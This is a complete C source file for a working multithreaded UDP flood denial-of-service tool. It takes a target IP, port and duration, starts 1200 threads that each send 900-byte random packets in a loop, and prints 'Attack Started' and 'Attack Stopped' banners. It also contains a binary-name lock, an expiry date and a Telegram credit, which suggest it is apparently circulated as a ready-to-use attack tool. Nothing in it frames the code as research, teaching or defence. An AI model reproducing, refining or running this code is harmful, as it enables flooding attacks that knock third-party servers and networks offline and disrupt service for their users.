#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <stdatomic.h>

#define BINARY_NAME "nand"  // Fixed Binary Name
#define EXPIRY_DATE "17-03-2025"
#define THREAD_COUNT 1200
#define PACKET_SIZE 900

// Structure to store attack parameters
typedef struct {
    char *target_ip;
    int target_port;
    int duration;
} attack_params;

// Global variables
volatile int keep_running = 1;
atomic_long total_data_sent = 0;

// Signal handler to stop the attack
void handle_signal(int signal) {
    keep_running = 0;
}

// Function to generate a random payload
void generate_random_payload(char *payload, int size) {
    for (int i = 0; i < size; i++) {
        payload[i] = rand() % 256;  // Random byte between 0 and 255
    }
}

// Function to monitor countdown timer
void *countdown_timer(void *arg) {
    int *duration = (int *)arg;
    while (*duration > 0 && keep_running) {
        printf("\r\033[1;34m[⏳] Time Left: %d sec\033[0m", *duration);
        fflush(stdout);
        sleep(1);
        (*duration)--;
    }
    printf("\n");
    pthread_exit(NULL);
}

// Function to perform the UDP flooding
void *udp_flood(void *arg) {
    attack_params *params = (attack_params *)arg;
    int sock;
    struct sockaddr_in server_addr;
    char *message;

    // Create a UDP socket
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    // Set up server address structure
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->target_port);
    server_addr.sin_addr.s_addr = inet_addr(params->target_ip);

    if (server_addr.sin_addr.s_addr == INADDR_NONE) {
        fprintf(stderr, "Invalid IP address.\n");
        close(sock);
        return NULL;
    }

    // Allocate memory for the flooding message
    message = (char *)malloc(PACKET_SIZE);
    if (message == NULL) {
        perror("Memory allocation failed");
        close(sock);
        return NULL;
    }

    // Generate random payload
    generate_random_payload(message, PACKET_SIZE);

    // Time-bound attack loop
    time_t end_time = time(NULL) + params->duration;
    while (time(NULL) < end_time && keep_running) {
        sendto(sock, message, PACKET_SIZE, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
        atomic_fetch_add(&total_data_sent, PACKET_SIZE);
    }

    free(message);
    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    // Check if binary name is changed
    if (strcmp(argv[0], "./" BINARY_NAME) != 0) {
        printf("\n\033[1;31m██████████████████████████████████\n"
               "█                                █\n"
               "█  ❌ Invalid Binary Name! ❌  █\n"
               "█  Use './nand' to run.        █\n"
               "█                                █\n"
               "██████████████████████████████████\033[0m\n\n");
        return EXIT_FAILURE;
    }

    // Validate arguments
    if (argc != 4) {
        printf("\n\033[1;36m██████████████████████████████████\n"
               "█                                █\n"
               "█  Usage: ./nand IP PORT TIME   █\n"
               "█                                █\n"
               "██████████████████████████████████\033[0m\n\n");
        return EXIT_FAILURE;
    }

    // Parse input arguments
    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);

    if (duration <= 0) {
        fprintf(stderr, "Invalid duration.\n");
        return EXIT_FAILURE;
    }

    // Display start message
    printf("\n\033[1;32m██████████████████████████████████\n"
           "█                                █\n"
           "█  🚀 Attack Started! 🚀        █\n"
           "█  Target: %s                   █\n"
           "█  Port: %d                      █\n"
           "█  Expiry: %s               █\n"
           "█                                █\n"
           "██████████████████████████████████\033[0m\n\n", target_ip, target_port, EXPIRY_DATE);

    // Setup signal handler
    signal(SIGINT, handle_signal);

    // Array of thread IDs
    pthread_t threads[THREAD_COUNT];
    attack_params params[THREAD_COUNT];

    // Create a thread for countdown timer
    pthread_t timer_thread;
    pthread_create(&timer_thread, NULL, countdown_timer, &duration);

    // Launch multiple threads for flooding
    for (int i = 0; i < THREAD_COUNT; i++) {
        params[i].target_ip = target_ip;
        params[i].target_port = target_port;
        params[i].duration = duration;

        if (pthread_create(&threads[i], NULL, udp_flood, &params[i]) != 0) {
            fprintf(stderr, "Failed to create thread %d\n", i);
        }
    }

    // Wait for all threads to finish
    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_join(threads[i], NULL);
    }

    // Stop the countdown timer
    keep_running = 0;
    pthread_join(timer_thread, NULL);

    // Display stop message
    printf("\n\033[1;31m██████████████████████████████████\n"
           "█                                █\n"
           "█  🛑 Attack Stopped! 🛑        █\n"
           "█  Stopped by @CreativeYDV      █\n"
           "█  From Telegram                █\n"
           "█                                █\n"
           "██████████████████████████████████\033[0m\n\n");

    return EXIT_SUCCESS;
}